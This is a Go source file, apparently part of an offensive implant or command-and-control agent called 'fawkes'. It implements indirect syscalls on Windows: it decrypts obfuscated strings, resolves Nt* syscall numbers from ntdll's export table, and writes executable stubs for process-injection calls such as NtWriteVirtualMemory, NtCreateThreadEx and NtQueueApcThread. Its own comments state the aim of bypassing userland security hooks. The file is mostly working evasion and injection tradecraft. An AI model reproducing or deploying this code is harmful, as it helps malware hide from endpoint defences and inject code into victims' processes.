//go:build windows

package commands

import (
	"fmt"
	"sync"
	"syscall"
	"unsafe"

	"fawkes/pkg/obfuscate"

	"golang.org/x/sys/windows"
)

// Indirect syscalls: resolve Nt* syscall numbers from ntdll export table,
// generate stubs that jump to ntdll's own syscall;ret gadget.
// This makes API calls appear to originate from ntdll, bypassing userland hooks.

// SyscallEntry holds a resolved syscall number and its indirect stub
type SyscallEntry struct {
	Name       string
	Number     uint16
	FuncAddr   uintptr // Address of the Nt* function in ntdll
	SyscallRet uintptr // Address of syscall;ret gadget in this function
	StubAddr   uintptr // Address of our indirect stub (in RWX memory)
}

// SyscallResolver manages indirect syscall resolution and stub generation
type SyscallResolver struct {
	mu          sync.Mutex
	entries     map[string]*SyscallEntry
	stubPool    uintptr // VirtualAlloc'd RWX memory for stubs
	stubPoolLen uintptr
	stubOffset  uintptr
	initialized bool
}

var (
	indirectSyscallResolver SyscallResolver
	indirectSyscallsActive  bool
)

// IMAGE_EXPORT_DIRECTORY for parsing ntdll exports
type imageExportDirectory struct {
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32
	Base                  uint32
	NumberOfFunctions     uint32
	NumberOfNames         uint32
	AddressOfFunctions    uint32
	AddressOfNames        uint32
	AddressOfNameOrdinals uint32
}

// InitIndirectSyscalls resolves Nt* syscall numbers from ntdll and generates
// indirect stubs. Call once at startup.
func InitIndirectSyscalls() error {
	return indirectSyscallResolver.init()
}

// IndirectSyscallsAvailable returns true if indirect syscalls are initialized
func IndirectSyscallsAvailable() bool {
	return indirectSyscallsActive
}

// GetResolvedSyscalls returns all resolved syscall entries for the info command
func GetResolvedSyscalls() map[string]*SyscallEntry {
	indirectSyscallResolver.mu.Lock()
	defer indirectSyscallResolver.mu.Unlock()
	// Return a copy
	result := make(map[string]*SyscallEntry, len(indirectSyscallResolver.entries))
	for k, v := range indirectSyscallResolver.entries {
		result[k] = v
	}
	return result
}

func (r *SyscallResolver) init() error {
	r.mu.Lock()
	defer r.mu.Unlock()

	if r.initialized {
		return nil
	}

	// Step 1: Get ntdll base address (decrypt name at runtime)
	ntdllStr := obfuscate.NtdllDll()
	defer obfuscate.Zero(ntdllStr)
	ntdllName, _ := syscall.UTF16PtrFromString(ntdllStr)
	ntdllBase, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(ntdllName)))
	if ntdllBase == 0 {
		return fmt.Errorf("failed to resolve base module")
	}

	// Step 2: Parse PE headers to find export directory
	entries, err := r.parseExports(ntdllBase)
	if err != nil {
		return fmt.Errorf("parse exports: %v", err)
	}
	r.entries = entries

	// Step 3: Allocate RW memory for stubs (4KB = room for ~180 stubs at 22 bytes each)
	// W^X pattern: allocate as RW, write stubs, then change to RX
	const stubPoolSize = 4096
	addr, err := windows.VirtualAlloc(0, stubPoolSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("VirtualAlloc for stub pool: %v", err)
	}
	r.stubPool = addr
	r.stubPoolLen = stubPoolSize
	r.stubOffset = 0

	// Step 4: Generate indirect stubs for key Nt* functions
	// Names are decrypted at runtime from the obfuscation table
	keyFunctions := []string{
		obfuscate.NtAllocateVirtualMemory(),
		obfuscate.NtWriteVirtualMemory(),
		obfuscate.NtProtectVirtualMemory(),
		obfuscate.NtCreateThreadEx(),
		obfuscate.NtFreeVirtualMemory(),
		obfuscate.NtOpenProcess(),
		obfuscate.NtClose(),
		obfuscate.NtReadVirtualMemory(),
		obfuscate.NtQueryInformationProcess(),
		obfuscate.NtResumeThread(),
		obfuscate.NtGetContextThread(),
		obfuscate.NtSetContextThread(),
		obfuscate.NtOpenThread(),
		obfuscate.NtQueueApcThread(),
	}

	for _, name := range keyFunctions {
		entry, ok := r.entries[name]
		if !ok {
			continue // Not found — skip, don't fail
		}
		if entry.SyscallRet == 0 {
			continue // No gadget found
		}
		stub, err := r.createStub(entry.Number, entry.SyscallRet)
		if err != nil {
			continue
		}
		entry.StubAddr = stub
	}

	// Step 5: Change stub pool from RW to RX (W^X enforcement)
	var oldProtect uint32
	err = windows.VirtualProtect(r.stubPool, stubPoolSize,
		windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		return fmt.Errorf("VirtualProtect stub pool to RX: %v", err)
	}

	r.initialized = true
	indirectSyscallsActive = true
	return nil
}
